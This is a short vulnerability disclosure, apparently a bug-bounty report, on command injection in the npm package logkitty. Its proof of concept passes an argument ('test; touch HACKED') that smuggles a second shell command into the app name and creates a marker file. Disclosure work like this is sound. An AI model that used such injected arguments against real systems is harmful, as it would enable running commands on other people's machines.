The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Check there aren't files called `HACKED`
2. Execute the following commands in another terminal:
```bash

npm i logkitty # Install affected module

logkitty android app 'test; touch HACKED' #  Note the *touch command* is inside the *'* (single quote), so it's an argument, while it will be executed anyway

```
3. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/zamotany/logkitty/issues/17)
 - [Issue Permalink](https://github.com/zamotany/logkitty/blob/master/src/android/adb.ts#L55)